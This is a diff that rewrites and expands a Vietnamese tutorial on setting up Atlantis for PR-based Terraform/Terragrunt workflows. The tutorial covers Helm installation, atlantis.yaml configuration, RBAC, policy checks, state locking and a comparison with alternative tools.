@@ -1,54 +1,54 @@
 # 🎓 Atlantis — GitOps cho Terraform/Terragrunt
 
 > **Tác giả:** Mr.Rom\
-> **Phiên bản:** v1.1.0\
+> **Phiên bản:** v2.0.0\
 > **Tạo lúc:** 24/05/2026\
-> **Cập nhật:** 25/05/2026\
+> **Cập nhật:** 07/06/2026\
 > **Level:** Intermediate\
 > **Tags:** [MUST-KNOW]\
-> **Thời lượng đọc:** ~25 phút\
-> **Prerequisites:** [01_terragrunt-dry-multi-env.md](01_terragrunt-dry-multi-env.md), GitHub repo
+> **Yêu cầu trước:** [Terragrunt — DRY Terraform cho multi-env multi-region](01_terragrunt-dry-multi-env.md), một GitHub repo chứa Terraform code.
 
-> 🎯 *Local `terraform apply` = no audit trail + credentials in laptop + state conflict. **Atlantis** = PR-based GitOps workflow: open PR → auto plan → review → comment `atlantis apply` → audit trail in Git. Bài này dạy setup + workflows + RBAC + Terragrunt integration.*
+> 🎯 *Chạy `terraform apply` ngay trên laptop nghe thì tiện, nhưng kéo theo ba vết thương: không có dấu vết kiểm toán (*audit trail* — lịch sử ai-làm-gì), credentials AWS nằm phơi trên máy cá nhân, và nhiều người apply cùng lúc gây xung đột state. **Atlantis** là một server tự host biến mọi thay đổi hạ tầng thành một workflow GitOps dựa trên Pull Request: mở PR → tự chạy plan → review → comment `atlantis apply` → mọi thứ in dấu vào Git. Bài này đi qua kiến trúc, cài đặt bằng Helm, viết `atlantis.yaml`, phân quyền (RBAC), khoá state và cách Atlantis ăn khớp với Terragrunt.*
 
 ## 🎯 Sau bài này bạn sẽ
 
-- [ ] Hiểu **Atlantis architecture** + PR-based workflow
-- [ ] Install Atlantis trên K8s với Helm
-- [ ] Configure **`atlantis.yaml`** project config
-- [ ] Workflow: **plan on PR open** + **apply via comment**
-- [ ] **RBAC**: who can apply what
-- [ ] **State locking** + queue management
-- [ ] **Terragrunt integration** với `terragrunt-atlantis-config`
-- [ ] So sánh Atlantis vs **Spacelift / env0 / Terraform Cloud**
+- [ ] Hiểu **kiến trúc Atlantis** và workflow dựa trên Pull Request.
+- [ ] Cài Atlantis trên K8s bằng Helm.
+- [ ] Cấu hình project bằng **`atlantis.yaml`**.
+- [ ] Nắm workflow: **plan tự động khi mở PR** + **apply qua comment**.
+- [ ] Phân quyền (**RBAC**): ai được apply cái gì.
+- [ ] Hiểu **khoá state** (*state locking*) và cách Atlantis xếp hàng (*queue*).
+- [ ] Tích hợp **Terragrunt** với `terragrunt-atlantis-config`.
+- [ ] So sánh Atlantis với **Spacelift / env0 / Terraform Cloud**.
 
 ---
 
-## Tình huống — 3 dev concurrent apply, state lock chaos
+## Tình huống — 3 dev apply cùng lúc, state lock vỡ trận
 
-3 dev cùng team, đều apply Terraform local:
-- Nguyen Van A: `cd dev/us-east-1/vpc && terraform apply` (10:00 AM).
-- Le Van B: `cd dev/us-east-1/vpc && terraform apply` (10:01 AM) — locked by Nguyen Van A's lock in DynamoDB. Le Van B wait 5 min.
-- Tran Van C: emergency, `terraform force-unlock <id>` to break Nguyen Van A's lock. Nguyen Van A's apply mid-way → partial state corruption.
+Hãy bắt đầu bằng một buổi sáng hỗn loạn rất hay gặp ở team nào còn để mỗi người tự chạy Terraform trên máy mình. Ba dev cùng team, đều apply Terraform local trên cùng một thư mục hạ tầng dùng chung:
 
-Sếp post-mortem:
-- *"3 người apply chung 1 thing, no coordination."*
-- *"Tran Van C force-unlock sai. State recovery 2 hours."*
-- *"Nguyen Van A's AWS credentials on laptop, IT audit fail."*
+- Nguyen Van A: `cd dev/us-east-1/vpc && terraform apply` lúc 10:00.
+- Le Van B: `cd dev/us-east-1/vpc && terraform apply` lúc 10:01 — nhưng state đang bị lock bởi Nguyen Van A trong DynamoDB, nên Le Van B phải ngồi chờ.
+- Tran Van C: đang có việc gấp, gõ `terraform force-unlock <id>` để phá lock của Nguyen Van A. Hậu quả: apply của Nguyen Van A đang chạy dở dang bị cắt ngang → state hỏng một phần (*partial corruption*).
 
-Solutions discussed:
-- Slack rule "ask before apply" — không scale.
-- Centralize via Atlantis. PRs queued, no concurrent apply, audit trail.
+Buổi post-mortem sau đó, sếp tóm gọn ba vấn đề:
 
-Sếp: *"Setup Atlantis tuần này. No more local apply on shared infra."*
+- Ba người cùng động vào một thứ mà chẳng ai phối hợp với ai.
+- Tran Van C `force-unlock` sai chỗ, kéo theo hai tiếng vật lộn khôi phục state.
+- Credentials AWS của Nguyen Van A nằm thẳng trên laptop — IT audit trượt ngay.
 
-→ Bài này dạy.
+Các hướng được mang ra cân nhắc:
+
+- Đặt một luật trên Slack kiểu "hỏi trước khi apply" — nghe thì dễ nhưng không scale, người quên là chuyện thường.
+- Tập trung hoá qua Atlantis: mọi PR được xếp hàng, không còn apply song song, và mọi thay đổi đều có dấu vết kiểm toán.
+
+Kết luận của sếp gọn lỏn: tuần này dựng Atlantis, chấm dứt apply local trên hạ tầng dùng chung. Phần còn lại của bài chính là cách làm việc đó.
 
 ---
 
-## 1️⃣ Atlantis architecture
+## 1️⃣ Kiến trúc Atlantis
 
-Atlantis là server tự host (Go binary, deploy trên K8s) — nhận webhook từ GitHub khi có PR, tự chạy `terraform plan`, comment kết quả vào PR. Reviewer approve + comment `atlantis apply` để execute. Workflow đầy đủ:
+Trước khi cài, cần hình dung Atlantis là cái gì và nó ngồi ở đâu trong dòng chảy công việc. Atlantis là một server tự host (một Go binary, thường deploy thành pod trên K8s) đứng giữa GitHub và cloud của bạn. Khi có PR, GitHub bắn *webhook* (lời gọi HTTP báo sự kiện) tới Atlantis; Atlantis tự chạy `terraform plan` rồi comment kết quả ngược lại vào PR. Reviewer xem plan, approve, rồi comment `atlantis apply` để Atlantis thực thi. Sơ đồ dưới đây dựng lại trọn vòng đời đó:
 
 ```mermaid
 graph TB
@@ -65,44 +65,47 @@ graph TB
     Atlantis -.->|state lock| DynamoDB[(DynamoDB)]
 ```
 
-**Components**:
-- **Atlantis Server**: Go binary running in K8s pod.
-- **Webhook**: GitHub/GitLab/Bitbucket sends PR events.
-- **Terraform/Terragrunt**: pre-installed in Atlantis container.
-- **Cloud credentials**: IAM role attached to Atlantis pod (IRSA).
-- **State backend**: S3 + DynamoDB (same as terraform).
+Bóc tách sơ đồ ra, hệ thống gồm năm mảnh ghép. Mỗi mảnh đảm một vai, và điểm đáng chú ý nhất là credentials không còn nằm trên máy ai cả:
 
-**Why GitOps for infra**:
-- **Single source of truth**: Git. Cluster state = Git state.
-- **Audit trail**: every change = PR with reviewer + approval.
-- **No local credentials**: Atlantis pod has IAM role. Devs commit code, never touch AWS keys.
-- **Coordination**: Atlantis queues applies, no concurrent state conflicts.
+- **Atlantis Server**: Go binary chạy trong một pod K8s.
+- **Webhook**: GitHub/GitLab/Bitbucket gửi các sự kiện PR sang.
+- **Terraform/Terragrunt**: cài sẵn trong container Atlantis.
+- **Cloud credentials**: một IAM role gắn vào pod Atlantis (qua IRSA), không phải key trên laptop.
+- **State backend**: S3 + DynamoDB (y như khi dùng Terraform thuần).
 
-🪞 **Ẩn dụ**: *Atlantis = **bouncer ở câu lạc bộ**. Devs (clubgoers) muốn vào (apply infra) phải qua bouncer (Atlantis) — check ID (auth), check capacity (state lock), let in one at a time (queue).*
+Vậy tại sao lại bê GitOps vào hạ tầng thay vì cứ apply như cũ? Bốn lợi ích dưới đây chính là lời giải cho ba vết thương ở phần mở đầu:
+
+- **Một nguồn sự thật duy nhất** (*single source of truth*): chính là Git. Trạng thái hạ tầng phản chiếu đúng trạng thái trong Git.
+- **Dấu vết kiểm toán**: mỗi thay đổi là một PR, có người review và approve hẳn hoi.
+- **Không còn credentials cục bộ**: pod Atlantis giữ IAM role; dev chỉ commit code, không bao giờ chạm vào AWS key.
+- **Có phối hợp**: Atlantis xếp hàng các lượt apply, triệt tiêu xung đột state do chạy song song.
+
+🪞 **Ẩn dụ**: *Atlantis giống một **bouncer đứng cửa câu lạc bộ**. Đám khách (dev) muốn vào (apply hạ tầng) đều phải qua tay bouncer (Atlantis) — kiểm tra giấy tờ (xác thực), xem còn chỗ không (state lock), và cho vào từng người một (xếp hàng).*
 
 ---
 
-## 2️⃣ Install Atlantis trên K8s
+## 2️⃣ Cài Atlantis trên K8s
 
-### Pre-requisites
+### Yêu cầu trước
 
-Cần 4 thứ trước khi cài Atlantis — đây là baseline tối thiểu, đa số shop K8s đã có sẵn 3/4:
+Có bốn thứ cần chuẩn bị trước khi cài Atlantis — đây là baseline tối thiểu, và thực tế đa số shop đã chạy K8s sẵn có 3/4:
 
-- K8s cluster.
-- GitHub repo with Terraform code.
-- AWS credentials (IAM role for IRSA, or static keys in Secret).
-- S3 bucket for state.
+- Một K8s cluster.
+- Một GitHub repo chứa Terraform code.
+- Credentials AWS (một IAM role cho IRSA, hoặc static key đặt trong Secret).
+- Một S3 bucket để lưu state.
 
-### Helm install
+### Cài bằng Helm
 
-Cài qua Helm chart official — chỉ cần customize `values.yaml` cho GitHub token, repo allowlist, IAM role. Setup minimum production-grade:
+Cách gọn nhất là dùng Helm chart chính thức — bạn chỉ cần tinh chỉnh `values.yaml` cho GitHub token, danh sách repo được phép (*allowlist*) và IAM role. Đầu tiên là thêm repo Helm và cập nhật:
 
 ```bash
 helm repo add runatlantis https://runatlantis.github.io/helm-charts
 helm repo update
 ```
 
-`values.yaml`:
+Tiếp theo là phần cốt lõi: file `values.yaml` ở mức tối thiểu nhưng đủ dùng cho production — đã bật ingress có TLS, gắn IRSA và xin sẵn PVC để giữ trạng thái lock:
+
 ```yaml
 # Image
 image:
@@ -153,6 +156,8 @@ defaultTFVersion: 1.7.0
 defaultTGVersion: 0.55.0    # Terragrunt
 ```
 
+Có values rồi thì tạo Secret chứa token + webhook secret, rồi cài chart vào namespace riêng:
+
 ```bash
 kubectl create secret generic atlantis-secrets \
   --from-literal=github-token=$GH_TOKEN \
@@ -164,40 +169,44 @@ helm install atlantis runatlantis/atlantis \
   --namespace atlantis --create-namespace
 ```
 
-### GitHub setup
+### Thiết lập phía GitHub
 
-1. Create bot account `atlantis-bot@acme.com`.
-2. Add bot as collaborator to infrastructure repo.
-3. Generate Personal Access Token (PAT) with `repo` scope.
-4. Add webhook in repo:
+Server đã chạy, giờ phải nối GitHub vào để nó biết đường bắn sự kiện sang. Bốn bước, làm tuần tự:
+
+1. Tạo một tài khoản bot `atlantis-bot@acme.com`.
+2. Thêm bot làm collaborator của repo hạ tầng.
+3. Tạo Personal Access Token (PAT) với scope `repo`.
+4. Thêm webhook trong repo:
    - URL: `https://atlantis.acmeshop.vn/events`
    - Content type: `application/json`
-   - Secret: `$WEBHOOK_SECRET` (must match Atlantis config).
+   - Secret: `$WEBHOOK_SECRET` (phải khớp với config của Atlantis).
    - Events: `Pull request`, `Pull request review`, `Issue comment`, `Push`.
 
-### Test
+### Kiểm tra
 
-Open PR with Terraform change → Atlantis comments plan within 1 min.
+Cách xác nhận nhanh nhất là mở thử một PR có sửa Terraform: nếu Atlantis comment plan trở lại PR, nghĩa là đường dây webhook đã thông và pipeline đã sống.
 
 ---
 
-## 3️⃣ Atlantis workflow
+## 3️⃣ Workflow của Atlantis
 
-### Default workflow
+### Workflow mặc định
 
-1. **Dev opens PR** with Terraform code change.
-2. **GitHub webhook** → Atlantis receives.
-3. **Atlantis runs `terraform plan`** in PR branch.
-4. **Plan posted as PR comment**.
-5. **Reviewer approves PR** (GitHub approval).
-6. **Reviewer (or anyone authorized) comments `atlantis apply`**.
-7. **Atlantis runs `terraform apply`**.
-8. **Result posted as PR comment** (success/error).
-9. **Optional**: auto-merge PR after apply (configurable).
+Đây là dòng chảy chuẩn từ lúc dev mở PR tới lúc thay đổi đáp xuống hạ tầng. Cả vòng gói gọn trong chín bước, và điểm hay là apply chỉ xảy ra khi có người chủ động comment, không tự động tràn ra:
 
-### Plan comment example
+1. **Dev mở PR** kèm thay đổi Terraform.
+2. **GitHub webhook** bắn sang, Atlantis nhận.
+3. **Atlantis chạy `terraform plan`** trên branch của PR.
+4. **Plan được post lên PR** dưới dạng comment.
+5. **Reviewer approve PR** (approve kiểu GitHub).
+6. **Reviewer (hoặc người có quyền) comment `atlantis apply`**.
+7. **Atlantis chạy `terraform apply`**.
+8. **Kết quả post lại lên PR** (thành công/lỗi).
+9. **Tuỳ chọn**: tự merge PR sau khi apply (bật/tắt được).
 
-Output Atlantis post lên PR có **diff format Git-like** — `+` thêm, `~` change, `-` xoá. Reviewer thấy ngay impact + có CTA cụ thể (`atlantis apply -p ...`) ngay trong PR comment:
+### Ví dụ comment plan
+
+Cái khiến reviewer dễ thở là Atlantis trình plan ngay trong comment dưới **định dạng diff kiểu Git** — `+` là thêm, `~` là thay đổi, `-` là xoá. Reviewer nhìn phát thấy ngay tác động, lại có sẵn nút bấm (CTA) là câu lệnh cụ thể để apply ngay tại chỗ:
 
 ```
 ran `plan` for project `dev-us-east-1-vpc`:
@@ -218,16 +227,18 @@ Changes:
     * `atlantis plan -p dev-us-east-1-vpc`
 ```
 
-→ Plan visible, reviewable, structured. Diff in Git-like format.
+Cái lợi nằm ở chỗ plan giờ hiển hiện ngay trong PR, có cấu trúc, ai cũng review được — thay vì nằm trong terminal của một người.
 
-### Apply comment
+### Comment apply
 
-Reviewer types:
+Khi đã yên tâm, reviewer gõ một dòng:
+
 ```
 atlantis apply -p dev-us-east-1-vpc
 ```
 
-→ Atlantis runs apply, comments result:
+Atlantis chạy apply rồi comment lại kết quả, vẫn ngay trong PR:
+
 ```
 ran `apply` for project `dev-us-east-1-vpc`:
 
@@ -236,9 +247,9 @@ Apply complete! Resources: 3 added, 1 changed, 0 destroyed.
 ```
 ```
 
-### Available commands
+### Các lệnh hay dùng
 
-7 lệnh chính Atlantis hiểu — phổ biến nhất là `plan` (auto-trigger khi mở PR), `apply` (manual sau approve). Lệnh `unlock` cứu nguy khi state lock stuck:
+Atlantis hiểu một bộ lệnh gọn. Phổ biến nhất là `plan` (tự chạy khi mở PR) và `apply` (gõ tay sau khi approve); riêng `unlock` là phao cứu sinh khi state lock bị kẹt. Bảng dưới liệt kê đầy đủ:
 
 | Command | Description |
 |---|---|
@@ -252,16 +263,15 @@ Apply complete! Resources: 3 added, 1 changed, 0 destroyed.
 
 ---
 
-## 4️⃣ `atlantis.yaml` config
+## 4️⃣ Cấu hình bằng `atlantis.yaml`
 
-### Concept
+### Khái niệm
 
-`atlantis.yaml` in repo root tells Atlantis:
-- Which folders contain Terraform.
-- Workflow per folder (TF version, commands).
-- Auto-plan triggers.
+File `atlantis.yaml` đặt ở gốc repo chính là tờ chỉ dẫn để Atlantis biết phải làm gì với repo của bạn. Nó trả lời ba câu hỏi: thư mục nào chứa Terraform, mỗi thư mục chạy theo workflow nào (phiên bản TF, các lệnh ra sao), và khi nào thì tự động plan.
 
-### Basic config
+### Cấu hình cơ bản
+
+Dưới đây là một ví dụ thực tế cho repo Terragrunt nhiều môi trường: ba project (dev VPC, dev EKS, prod VPC), trong đó riêng prod được siết thêm `apply_requirements` để bắt buộc có approval và không xung đột mới cho apply:
 
 ```yaml
 version: 3
@@ -312,9 +322,9 @@ workflows:
         - run: terragrunt apply -no-color $PLANFILE
 ```
 
-### `when_modified` patterns
+### Mẫu `when_modified`
 
-`autoplan.when_modified`: triggers plan when matching files change.
+Trường `autoplan.when_modified` quyết định: khi những file nào thay đổi thì project này mới được plan lại. Nhờ nó, Atlantis chỉ plan đúng project liên quan tới PR thay vì plan toàn bộ:
 
 ```yaml
 when_modified:
@@ -323,9 +333,11 @@ when_modified:
   - "../../../../modules/vpc/**"   # cross-folder dependency
 ```
 
-→ Atlantis plans only relevant projects per PR. Smart partial plans.
+Kết quả là Atlantis chỉ chạy plan cho những project thật sự bị ảnh hưởng — plan từng phần một cách thông minh, không phí công với các thư mục không đổi.
 
-### Apply requirements
+### Điều kiện trước khi apply
+
+Để chặn việc apply ẩu, bạn khai báo `apply_requirements` — những điều kiện bắt buộc phải thoả trước khi Atlantis cho phép apply:
 
 ```yaml
 apply_requirements:
@@ -334,11 +346,11 @@ apply_requirements:
   - undiverged        # PR up to date with base branch
 ```
 
-→ Apply blocked until conditions met.
+Khi chưa đủ điều kiện, lệnh apply sẽ bị chặn — đây là chốt chặn rất hữu dụng cho môi trường prod.
 
-### Generating atlantis.yaml for Terragrunt
+### Sinh `atlantis.yaml` cho Terragrunt
 
-For huge Terragrunt repos (75+ folders), manual maintain `atlantis.yaml` painful. Use **`terragrunt-atlantis-config`**:
+Với repo Terragrunt đồ sộ (75+ thư mục), bảo trì `atlantis.yaml` bằng tay là cực hình. Lúc này hãy để **`terragrunt-atlantis-config`** làm hộ — nó quét toàn bộ thư mục Terragrunt rồi tự sinh các entry project:
 
 ```bash
 # Generate atlantis.yaml from Terragrunt repo
@@ -348,9 +360,8 @@ terragrunt-atlantis-config generate \
   --autoplan
 ```
 
-→ Tool scans Terragrunt folders, generates project entries.
+Tốt nhất là cho lệnh này chạy trong CI để file luôn được tái sinh mỗi khi cấu trúc thư mục thay đổi:
 
-Run in CI:
 ```yaml
 # .github/workflows/atlantis-config.yml
 - name: Generate atlantis.yaml
@@ -362,17 +373,20 @@ Run in CI:
 
 ---
 
-## 5️⃣ RBAC — Who can apply what
+## 5️⃣ RBAC — Ai được apply cái gì
 
-### Atlantis built-in checks
+### Các tầng kiểm soát có sẵn của Atlantis
 
-1. **GitHub OAuth token**: Atlantis bot has access only to whitelisted repos (`orgAllowlist: "github.com/acme/*"`).
-2. **`apply_requirements`**: PR must be approved by repo collaborator with write permission.
-3. **Project-level locks**: only PR holding lock can apply.
+Atlantis không tự phát minh ra một hệ phân quyền riêng — nó dựa lưng vào GitHub. Có ba lớp kiểm soát chồng lên nhau:
 
-### Restrict apply to specific users
+1. **GitHub OAuth token**: bot Atlantis chỉ truy cập được các repo nằm trong allowlist (`orgAllowlist: "github.com/acme/*"`).
+2. **`apply_requirements`**: PR phải được approve bởi collaborator có quyền write.
+3. **Lock cấp project**: chỉ PR đang giữ lock mới được apply.
 
-`atlantis.yaml`:
+### Giới hạn apply cho đúng người
+
+Muốn chỉ đội SRE được động vào prod, bạn kết hợp `atlantis.yaml` với branch protection và CODEOWNERS của GitHub. Trước hết, trong `atlantis.yaml` siết các project prod:
+
 ```yaml
 projects:
   - name: prod-*
@@ -380,25 +394,28 @@ projects:
     allowed_overrides: []
 ```
 
-GitHub branch protection:
+Tiếp đến, bật branch protection cho nhánh `main` để bắt buộc review từ CODEOWNERS:
+
 ```
 main branch protection:
   - Require 2 reviews
   - Require review from CODEOWNERS
 ```
 
-`.github/CODEOWNERS`:
+Và cuối cùng, file `.github/CODEOWNERS` chỉ định ai sở hữu thư mục nào:
+
 ```
 # Only @sre-team can approve prod infra
 /live/prod/  @acme/sre-team
 /modules/    @acme/platform-team
 ```
 
-→ PR touching `live/prod/` requires @sre-team approval. Atlantis honor approval via `apply_requirements: [approved]`.
+Ráp lại: một PR đụng vào `live/prod/` bắt buộc phải có approval của `@sre-team`, và Atlantis tôn trọng approval đó qua `apply_requirements: [approved]`. Phân quyền nằm trọn trong cơ chế của GitHub, không cần hệ riêng.
 
-### Conftest / OPA policy check
+### Kiểm tra policy bằng Conftest / OPA
 
-Block dangerous operations:
+Đôi khi "được approve" vẫn chưa đủ — bạn muốn chặn cứng những thao tác nguy hiểm bất kể ai duyệt. Đó là lúc gắn một bước policy check vào workflow:
+
 ```yaml
 workflows:
   terragrunt:
@@ -410,7 +427,8 @@ workflows:
         - run: conftest test plan.json --policy policies/
 ```
 
-`policies/no-public-s3.rego`:
+Policy được viết bằng Rego. Ví dụ một luật cấm tạo S3 bucket public:
+
 ```rego
 package main
 
@@ -421,20 +439,23 @@ deny[msg] {
 }
 ```
 
-→ Atlantis fails plan if policy violated. Even if approved, can't apply.
+Khi policy bị vi phạm, Atlantis cho plan thất bại — nghĩa là dù PR đã được approve, vẫn không thể apply. Đây là lớp chặn cuối cùng nằm ngoài tầm với của con người duyệt ẩu.
 
 ---
 
-## 6️⃣ State locking + Queue
+## 6️⃣ Khoá state + Xếp hàng
 
-### Atlantis lock
+### Lock của Atlantis
 
-Atlantis maintains **per-project lock** in BoltDB (default) or Redis.
+Atlantis tự giữ một **lock cấp project** trong BoltDB (mặc định) hoặc Redis. Cơ chế rất đơn giản: khi PR A bắt đầu apply lên `dev-us-east-1-vpc`, mọi PR khác đụng vào cùng project sẽ phải chờ.
 
-When PR A starts apply on `dev-us-east-1-vpc`:
-- Atlantis locks `dev-us-east-1-vpc`.
-- PR B opens with same project → comment shows "🔒 locked by PR A".
-- PR B plan waits for lock.
+Cụ thể, khi PR A apply `dev-us-east-1-vpc`:
+
+- Atlantis khoá `dev-us-east-1-vpc`.
+- PR B mở ra cùng project → comment hiện "🔒 locked by PR A".
+- Plan của PR B nằm chờ tới khi lock được nhả.
+
+Sơ đồ dưới minh hoạ vòng khoá–nhả này:
 
 ```mermaid
 graph LR
@@ -445,40 +466,44 @@ graph LR
     Unlock --> PR_B_plan[PR B plan starts]
 ```
 
-### Manual unlock
+### Nhả lock thủ công
 
-If apply crashes, lock stuck:
+Nếu apply lăn đù ra giữa chừng, lock có thể kẹt lại. Lúc đó nhả tay bằng cách comment ngay trong PR:
+
 ```
 # In PR comment
 atlantis unlock
 ```
 
-Or via UI: `https://atlantis.acmeshop.vn/locks`.
+Hoặc vào trang UI để xem và xoá lock: `https://atlantis.acmeshop.vn/locks`.
 
-### vs Terraform native lock (DynamoDB)
+### So với lock gốc của Terraform (DynamoDB)
 
-Atlantis lock (BoltDB) + Terraform lock (DynamoDB):
-- Atlantis: high-level (per-project, prevents concurrent PRs).
-- DynamoDB: low-level (per-state-file, prevents concurrent Terraform processes).
+Nhiều người thắc mắc Atlantis lock với DynamoDB lock có đá nhau không — câu trả lời là chúng ở hai tầng khác nhau và bổ trợ cho nhau:
 
-Both work together. Atlantis lock prevents most conflicts; DynamoDB is final safety net.
+- **Atlantis lock** (BoltDB): tầng cao — theo project, ngăn nhiều PR cùng chạm một project.
+- **DynamoDB lock**: tầng thấp — theo từng file state, ngăn nhiều tiến trình Terraform cùng ghi một state.
+
+Hai lớp này làm việc cùng nhau: lock của Atlantis chặn phần lớn xung đột ngay từ đầu, còn DynamoDB là lưới an toàn cuối cùng.
 
 ---
 
-## 7️⃣ Terragrunt + Atlantis integration
+## 7️⃣ Tích hợp Terragrunt + Atlantis
 
-### Challenge
+### Thử thách
 
-Terragrunt has cross-module dependencies (`dependency` block). PR touching shared module affects N projects.
+Terragrunt có các phụ thuộc chéo giữa module (qua khối `dependency`). Một PR sửa module dùng chung có thể ảnh hưởng tới N project cùng lúc — và đây mới là chỗ khó.
 
-Atlantis needs to:
-- Detect all impacted projects.
-- Plan in dependency order.
-- Lock all related projects.
+Để xử lý cho đúng, Atlantis cần:
 
-### `terragrunt-atlantis-config` workflow
+- Phát hiện hết các project bị ảnh hưởng.
+- Plan theo đúng thứ tự phụ thuộc.
+- Khoá tất cả project liên quan.
 
-Generated `atlantis.yaml`:
+### Workflow với `terragrunt-atlantis-config`
+
+May là `terragrunt-atlantis-config` lo giúp phần phát hiện phụ thuộc. File `atlantis.yaml` nó sinh ra sẽ tự nhét các đường dẫn upstream vào `when_modified`, để khi một module bị đụng thì mọi project phụ thuộc đều được plan lại:
+
 ```yaml
 projects:
   - name: dev-us-east-1-vpc
@@ -502,11 +527,12 @@ projects:
         - "../../../../modules/vpc/**"  # depends on VPC module
 ```
 
-→ Tool detects dependencies, includes upstream paths in `when_modified`.
+Nhìn vào EKS là thấy rõ: vì nó phụ thuộc VPC, tool đã chủ động thêm cả đường dẫn config lẫn module của VPC vào danh sách kích hoạt.
 
-### Atlantis runs Terragrunt
+### Để Atlantis chạy Terragrunt
 
-`workflows.terragrunt`:
+Phần còn lại chỉ là dạy workflow gọi `terragrunt` thay cho `terraform`. Đây cũng là chỗ tốt để bật cache plugin nhằm tránh tải lại provider mỗi lần init:
+
 ```yaml
 plan:
   steps:
@@ -522,11 +548,12 @@ apply:
     - run: terragrunt apply -no-color $PLANFILE
 ```
 
-→ Atlantis runs `terragrunt` instead of `terraform`. Pre-installed in Atlantis image.
+Điều kiện để chạy được là binary `terragrunt` phải có sẵn trong image của Atlantis.
 
-### Custom image with both
+### Image tuỳ biến chứa cả hai
 
-If using community Atlantis image lacks Terragrunt:
+Nếu image Atlantis bạn dùng chưa kèm Terragrunt, hãy bồi thêm vào bằng một Dockerfile nhỏ:
+
 ```dockerfile
 FROM runatlantis/atlantis:v0.27.0
 
@@ -536,13 +563,15 @@ RUN apk add --no-cache wget \
     && chmod +x /usr/local/bin/terragrunt
 ```
 
-→ Build + push, reference in Helm values.
+Build, push image này lên registry rồi trỏ tới nó trong Helm values là xong.
 
 ---
 
-## 8️⃣ Atlantis vs alternatives
+## 8️⃣ Atlantis so với các lựa chọn khác
 
-| Tool | Type | Pros | Cons | $$$ |
+Atlantis không phải lựa chọn duy nhất cho GitOps hạ tầng — nó là phương án OSS tự host, đổi công sức vận hành lấy quyền kiểm soát và chi phí bằng không. Bảng dưới đặt nó cạnh các đối thủ SaaS để bạn thấy mình đánh đổi gì lấy gì:
+
+| Tool | Type | Ưu điểm | Nhược điểm | $$$ |
 |---|---|---|---|---|
 | **Atlantis** | OSS self-host | Free, full control, customizable workflows | Self-host ops | $0 |
 | **Spacelift** | SaaS | Beautiful UI, drift detection, policy as code, multi-VCS | Paid | Free tier; $0.05/runner-min |
@@ -551,44 +580,49 @@ RUN apk add --no-cache wget \
 | **Scalr** | SaaS | OpenTofu compatible, audit, modules | Paid | $$ |
 | **DIY GitHub Actions** | OSS DIY | No infra to maintain | Less PR-native | $0 |
 
-### When Atlantis wins
+Bảng cho cái nhìn tổng thể, nhưng chọn đúng thì phải soi theo hoàn cảnh. Bốn nhóm dưới đây gom các tình huống điển hình.
 
-- Self-host preference (avoid SaaS lock-in).
-- Customization needs (custom workflows, plugins).
-- Multi-VCS support not needed.
-- Team OK ops Kubernetes.
+### Khi Atlantis thắng
 
-### When Spacelift / env0 win
+- Muốn tự host, né lệ thuộc nhà cung cấp SaaS.
+- Cần tuỳ biến sâu (workflow riêng, plugin).
+- Không cần hỗ trợ nhiều hệ VCS.
+- Team thoải mái vận hành Kubernetes.
 
-- No K8s ops appetite.
-- Want polished UI.
-- Need built-in drift detection, policies.
-- Pay for productivity.
+### Khi Spacelift / env0 thắng
 
-### When Terraform Cloud wins
+- Không có hứng thú vận hành K8s.
+- Muốn một UI bóng bẩy.
+- Cần sẵn drift detection và policy.
+- Sẵn sàng trả tiền để đổi lấy năng suất.
 
-- HashiCorp ecosystem buy-in.
-- Mature, official support.
-- Sentinel policy (Terraform-specific).
+### Khi Terraform Cloud thắng
 
-### When GitHub Actions enough
+- Đã đặt cược vào hệ sinh thái HashiCorp.
+- Cần độ chín và hỗ trợ chính hãng.
+- Cần policy bằng Sentinel (chỉ Terraform mới có).
 
-- Small team, < 10 modules.
-- Simple workflows.
-- Already heavy in GitHub Actions ecosystem.
+### Khi GitHub Actions là đủ
 
-→ **2026 recommend**:
-- Startup: GitHub Actions or Atlantis.
-- Mid: Atlantis.
-- Enterprise: Spacelift / env0 / Terraform Cloud.
+- Team nhỏ, dưới 10 module.
+- Workflow đơn giản.
+- Vốn đã xài nặng hệ sinh thái GitHub Actions.
+
+Gộp lại, khuyến nghị cho năm 2026 tuỳ quy mô như sau:
+
+- Startup: GitHub Actions hoặc Atlantis.
+- Quy mô vừa: Atlantis.
+- Doanh nghiệp lớn: Spacelift / env0 / Terraform Cloud.
 
 ---
 
-## 9️⃣ Hands-on: Setup Atlantis end-to-end
+## 9️⃣ Hands-on: Dựng Atlantis từ đầu đến cuối
 
-(Combine prior sections)
+Giờ ráp mọi mảnh ở trên thành một quy trình chạy thật, theo sáu bước từ IAM tới một PR mẫu chạy trọn vòng plan–apply.
 
-### Step 1: AWS IAM role for Atlantis (IRSA)
+### Bước 1: IAM role cho Atlantis (IRSA)
+
+Trước hết, Atlantis cần một danh tính trên AWS để gọi API thay cho dev. Cách sạch sẽ là IRSA — gắn IAM role vào service account của pod:
 
 ```bash
 # Create OIDC provider for EKS (if not already)
@@ -618,15 +652,19 @@ aws iam attach-role-policy --role-name AtlantisRole --policy-arn arn:aws:iam::aw
 # (Use narrower policy in production!)
 ```
 
-### Step 2: Install Atlantis Helm
+Lưu ý dòng cuối: `AdministratorAccess` chỉ để demo cho nhanh — production phải thay bằng policy hẹp đúng nhu cầu (xem lại phần Cạm bẫy).
 
-(See §2 above)
+### Bước 2: Cài Atlantis bằng Helm
 
-### Step 3: GitHub webhook
+(Xem §2 phía trên — tạo Secret rồi `helm install`.)
 
-(See §2 above)
+### Bước 3: Webhook GitHub
 
-### Step 4: Add `atlantis.yaml` to repo
+(Xem §2 phía trên — bot account, PAT, và webhook trỏ tới `/events`.)
+
+### Bước 4: Thêm `atlantis.yaml` vào repo
+
+Sinh file config từ chính repo Terragrunt rồi commit lên:
 
 ```bash
 cd infrastructure
@@ -636,9 +674,10 @@ git commit -m "Add Atlantis config"
 git push
 ```
 
-### Step 5: Add `.atlantis/` workflow
+### Bước 5: Thêm workflow `.atlantis/`
 
-`.atlantis/workflows.yaml` (per-repo workflow definitions):
+Định nghĩa workflow ở cấp repo — bản này chèn thêm bước `tfsec` để quét bảo mật trước khi plan:
+
 ```yaml
 workflows:
   terragrunt:
@@ -652,7 +691,9 @@ workflows:
         - run: terragrunt apply -no-color $PLANFILE
 ```
 
-### Step 6: Test PR
+### Bước 6: Thử với một PR
+
+Cuối cùng là màn nghiệm thu: mở một PR sửa CIDR của VPC dev rồi quan sát Atlantis tự nhảy vào:
 
 ```bash
 git checkout -b test-vpc-update
@@ -663,7 +704,8 @@ git push origin test-vpc-update
 gh pr create --title "Update dev VPC CIDR"
 ```
